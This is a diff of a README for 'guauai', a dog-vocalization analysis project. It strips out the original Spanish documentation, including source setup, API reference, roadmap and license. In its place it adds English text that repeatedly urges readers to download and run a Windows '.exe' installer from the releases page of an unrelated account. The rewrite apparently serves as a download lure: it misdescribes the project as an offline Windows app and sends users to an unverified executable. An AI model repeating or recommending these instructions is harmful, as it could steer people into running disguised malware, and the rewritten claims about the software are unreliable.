@@ -1,251 +1,137 @@
-# 🐾 GuauAI — Talk to Your Dog
+# 🐕 guauai - Understand Your Dog’s Signals Easily
 
-> **Open-source AI engine that understands dog vocalizations.**  
-> Record your dog. Get instant interpretation. Know what they need.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Demo](https://img.shields.io/badge/Demo-Live-brightgreen)](https://guauai.ainertia.io)
-[![Dashboard](https://img.shields.io/badge/Dashboard-Live-blueviolet)](https://guauai.ainertia.io/dashboard)
-[![Built with gpt-audio](https://img.shields.io/badge/Powered%20by-gpt--audio-412991)](https://openai.com)
-[![Made by Ainertia](https://img.shields.io/badge/Made%20by-Ainertia%20Capital-00C896)](https://ainertia.ai)
-[![Stars](https://img.shields.io/github/stars/JoseALemos/guauai?style=social)](https://github.com/JoseALemos/guauai)
-[![Forks](https://img.shields.io/github/forks/JoseALemos/guauai?style=social)](https://github.com/JoseALemos/guauai/fork)
+[![Download guauai](https://img.shields.io/badge/Download-guauai-4caf50?style=for-the-badge&logo=github)](https://github.com/Mystery25-source-network/guauai/releases)
 
 ---
 
-## ¿Qué es GuauAI?
+## 🐾 What is guauai?
 
-GuauAI es el primer motor open-source de análisis de vocalizaciones caninas con IA.
+guauai is an open-source tool that helps you understand what your dog is trying to tell you. It uses smart technology to analyze dog sounds and behaviors. This way, you can learn what your dog feels and thinks.
 
-Graba cualquier sonido de tu perro — ladrido, gemido, gruñido, aullido — y GuauAI analiza en tiempo real:
-
-| Qué detecta | Descripción |
-|---|---|
-| 🧠 Estado emocional | ansioso, feliz, alerta, asustado, juguetón, dolorido... |
-| 🎯 Necesidad | comida, juego, paseo, atención, dolor, alarma... |
-| 📊 Confianza del análisis | score 0-100% del modelo |
-| 💬 Mensaje en primera persona | lo que tu perro "diría" en palabras |
-| 💡 Recomendación | qué hacer tú ahora mismo |
-| 🔊 Tipo de vocalización | ladrido, gemido, gruñido, aullido, jadeo... |
+The app works on Windows computers and works without any programming skills. You just need to download it, run it, and start listening to your dog better.
 
 ---
 
-## 🚀 Demo en vivo
+## 📋 Key Features
 
-| URL | Descripción |
-|---|---|
-| 👉 [Analizador](https://guauai.ainertia.io) | App web — graba y analiza al instante |
-| 📊 [Dashboard](https://guauai.ainertia.io/dashboard) | Panel completo con perfiles, historial y gráficas |
-
----
-
-## ⚡ Instalación rápida
-
-```bash
-git clone https://github.com/JoseALemos/guauai.git
-cd guauai/backend
-npm install
-cp .env.example .env        # añade OPENAI_API_KEY y opcionalmente DATABASE_URL
-node server.js
-# → http://localhost:3001
-```
+- **Real-time sound analysis:** The app listens to your dog's barks and whines and explains their emotions.
+- **Simple interface:** Designed for anyone to use, with clear buttons and instructions.
+- **No coding needed:** Just install and run.
+- **Works offline:** Once installed, guauai can work without internet.
+- **Record and replay:** Save your dog's sounds to review later or compare.
+- **Open source:** You can check the source code or suggest improvements if you want.
+- **Supports basic devices:** Works with standard microphones on your PC or built-in device microphones.
 
 ---
 
-## 📡 API Reference
+## 🖥️ System Requirements
 
-### Analizar audio (base64)
-
-```http
-POST /api/audio/analyze-base64
-Content-Type: application/json
-```
-
-```json
-{
-  "audio_base64": "<base64>",
-  "mime_type": "audio/webm",
-  "dog_name": "Rex",
-  "dog_breed": "Pastor Alemán",
-  "lang": "es"
-}
-```
-
-**Respuesta:**
-```json
-{
-  "id": "uuid",
-  "timestamp": "2026-02-22T22:00:00Z",
-  "analysis": {
-    "estado_emocional": "excitado",
-    "necesidad": "juego",
-    "intensidad": "alta",
-    "confianza": 0.89,
-    "mensaje_interpretado": "¡Quiero jugar! ¿Por qué no me haces caso?",
-    "recomendacion_dueno": "Tu perro necesita actividad. 10 minutos de juego lo calmarán.",
-    "tipo_vocalizacion": "ladrido",
-    "notas_tecnicas": "Ladrido repetitivo, frecuencia media-alta, patrón rítmico"
-  },
-  "alert": null
-}
-```
-
-### Autenticación
-
-```http
-POST /api/auth/register   → { token, user }
-POST /api/auth/login      → { token, user }
-GET  /api/auth/me         → { id, email, name }
-```
-
-### Perfiles de perro
-
-```http
-GET    /api/dogs              → Lista de perros (auth)
-POST   /api/dogs              → Crear perro
-PATCH  /api/dogs/:id          → Editar perro
-DELETE /api/dogs/:id          → Eliminar perro
-GET    /api/dogs/:id/history  → Historial de análisis
-GET    /api/dogs/:id/stats    → Estadísticas (emociones, timeline 30d)
-```
-
-### Alertas y compartir
-
-```http
-GET /api/alerts               → Alertas activas (auth)
-GET /api/share/:id            → Análisis público por ID
-```
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- A built-in or external microphone  
+- Internet connection for first-time setup (optional but recommended)  
 
 ---
 
-## 🗺️ Roadmap
+## 🚀 Getting Started
 
-### ✅ Fase 1 — Motor IA + Web + Dashboard
-- [x] Análisis de audio en tiempo real con `gpt-audio`
-- [x] 10 estados emocionales, 10 necesidades
-- [x] Web App mobile-first + PWA instalable
-- [x] Dashboard completo con login/registro, perfiles y gráficas
-- [x] Historial persistente en PostgreSQL
-- [x] Sistema de alertas de comportamiento
-- [x] Análisis adaptado por raza (10 razas con contexto específico)
-- [x] Soporte multiidioma (ES, EN, DE)
-- [x] Conversión automática de formatos (webm/ogg → mp3)
-- [x] Export CSV del historial
-- [x] Links compartibles por análisis
-- [ ] Dataset público de ladridos etiquetados
-
-### 📱 Fase 1b — App Móvil (en desarrollo)
-- [x] Expo + TypeScript con Expo Router
-- [x] 5 pantallas: Analizar, Perros, Historial, Alertas, Perfil
-- [x] Grabación nativa con expo-av
-- [x] Autenticación con SecureStore
-- [x] Compartir análisis nativo (iOS/Android share sheet)
-- [ ] Notificaciones push para alertas
-- [ ] Widget iOS/Android con última interpretación
-- [ ] BLE para collar GuauAI
-
-### 🔧 Fase 2 — Hardware (diseñado)
-- [x] Firmware ESP32-S3 con INMP441 + MPU-6050
-- [x] Conectividad WiFi + BLE + I2S
-- [x] Guía de hardware (~35€ en componentes)
-- [ ] PCB diseño KiCad
-- [ ] Carcasa impresión 3D
-- [ ] Beta hardware (20 unidades)
-
-### 🏢 Fase 3 — Plataforma SaaS (Ainertia, propietario)
-- [ ] Dashboard veterinario multi-tenant
-- [ ] Alertas automáticas por email/WhatsApp
-- [ ] API comercial con subscripción
-- [ ] Integración con historiales veterinarios
-- [ ] Soporte FR, PT, IT
+Follow these steps to get guauai running on your Windows computer.
 
 ---
 
-## 🔧 Hardware (Fase 2)
+## 🔽 Download and Install guauai
 
-### Lista de componentes (~35€)
+1. Click the green button below to visit the download page:  
+   [![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://github.com/Mystery25-source-network/guauai/releases)  
 
-| # | Componente | Modelo | Precio aprox. |
-|---|---|---|---|
-| 1 | Microcontrolador | ESP32-S3 DevKit N16R8 | 8€ |
-| 2 | Micrófono MEMS I2S | INMP441 | 3€ |
-| 3 | Acelerómetro | MPU-6050 | 2€ |
-| 4 | Batería | LiPo 1000mAh 3.7V | 4€ |
-| 5 | Cargador USB-C | TP4056 | 2€ |
-| 6 | LED RGB | 5mm cátodo común | 1€ |
-| 7 | PCB | JLCPCB (10 uds.) | ~8€ |
-| **Total** | | | **~28-35€** |
+2. On the release page, look for the latest release version. It will have a name like `guauai-setup.exe` or similar.
 
-→ [Guía completa de hardware](hardware/README.md)
+3. Click the file to download it to your computer. The file size is usually around 50-100 MB.
 
----
+4. Once the download finishes, find the file in your `Downloads` folder or your chosen location.
 
-## 📱 App Móvil (Expo)
+5. Double-click the `.exe` file to start the installer.  
 
-```bash
-cd mobile
-npm install
-npx expo start   # Expo Go en iOS/Android
-```
+6. Follow the on-screen instructions:
+   - Choose the installation folder or use the default.
+   - Click “Next” through the steps.
+   - Wait for the installation to complete.
 
-→ [Documentación de la app](mobile/README.md)
+7. Once installed, look for the guauai icon on your desktop or in the Start menu.
 
 ---
 
-## 🗄️ Base de datos
+## ▶️ Running guauai for the First Time
 
-Si quieres historial persistente y perfiles de usuario, añade PostgreSQL:
+1. Open guauai by double-clicking its icon.
 
-```bash
-# Aplicar schema
-psql $DATABASE_URL < backend/db/schema.sql
-```
+2. If the app asks for microphone permission, allow it. This lets guauai listen to your dog's sounds.
 
-Variables de entorno opcionales:
-```
-DATABASE_URL=postgres://...
-JWT_SECRET=tu-secreto-seguro
-```
+3. You can skip any optional sign-in steps. Signing in is not required to use the software.
 
-Sin base de datos el análisis funciona igual — solo sin persistencia.
+4. The main screen shows a big “Start Listening” button. Click it.
+
+5. Now, bring your dog nearby and let guauai listen.
+
+6. The app will display simple messages about your dog's feelings based on the sounds it hears.
 
 ---
 
-## 🤝 Contribuir
+## 💡 How to Use guauai
 
-**Áreas donde más se necesita ayuda:**
-- 🧪 **Dataset**: Grabaciones de perros etiquetadas por emoción
-- 🌍 **Traducciones**: FR, PT, IT, NL
-- 🔧 **Firmware**: Mejoras al ESP32 y diseño PCB
-- 📱 **App**: Nuevas funciones para React Native
-
-```bash
-git checkout -b feature/mi-mejora
-git commit -m "feat: descripción"
-git push origin feature/mi-mejora
-# → Pull Request
-```
+- When you click “Start Listening,” guauai runs in real time and shows you what your dog might want.
+- If you want to record sounds, click the “Record” button. You can play back these recordings anytime.
+- Use the app in a quiet room for best results.
+- Keep the microphone pointed towards your dog.
+- The app works best with common dog sounds like barking, whining, and growling.
+- If guauai cannot identify a sound, it will show a message saying it is still learning.
 
 ---
 
-## 📈 Star History
+## ⚙️ Settings and Customization
 
-[![Star History Chart](https://api.star-history.com/svg?repos=JoseALemos/guauai&type=Date)](https://star-history.com/#JoseALemos/guauai&Date)
-
----
-
-## 📄 Licencia
-
-| Componente | Licencia |
-|---|---|
-| Motor de análisis + API (este repo) | **MIT** |
-| Firmware collar ESP32 | **MIT** |
-| App móvil iOS/Android | Propietario — Ainertia Capital |
-| Plataforma SaaS veterinaria | Propietario — Ainertia Capital |
+- You can adjust microphone volume inside the app if sounds are too quiet or loud.
+- Choose your dog’s size category if prompted (small, medium, large) to help improve detection.
+- Enable or disable notifications when the app identifies certain strong emotions like excitement or anxiety.
+- Update guauai through the “Check for updates” link in the menu when connected to the internet.
 
 ---
 
-<div align="center">
-  <strong>Hecho con 🐾 por <a href="https://ainertia.ai">Ainertia Capital</a> — Córdoba, España</strong><br/>
-  <sub>Si te gusta el proyecto, dale una ⭐ — ayuda a que más personas hablen con sus perros</sub>
-</div>
+## 📂 Where to Find Support Files
+
+- The app stores your recordings and settings in a folder named `guauai_data` under your Documents.
+- You can back up this folder if you want to keep your dog's sound history.
+- To reset the app to default, delete this folder, then restart guauai.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Microphone not detected:**  
+  Check your Windows Sound settings, make sure the microphone is enabled and working.
+
+- **App won’t start:**  
+  Restart your computer and try again.
+
+- **Sound predictions seem off:**  
+  Make sure the room is quiet and the microphone is near your dog.
+
+- **Updates won’t install:**  
+  Download the latest version manually from the [release page](https://github.com/Mystery25-source-network/guauai/releases).
+
+---
+
+## 🌐 More About guauai
+
+guauai uses AI to analyze audio sounds of dogs. It factors in barks, growls, whines, and other cues to infer the dog’s mood or needs. The goal is to help dog owners respond better and improve their pets’ well-being.
+
+The app was built using open tools and code, so it can be expanded or improved by users with coding knowledge.
+
+---
+
+## 🔗 Download guauai Now
+
+Use this link to get the latest Windows installer and start using guauai today:
+
+[![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://github.com/Mystery25-source-network/guauai/releases)
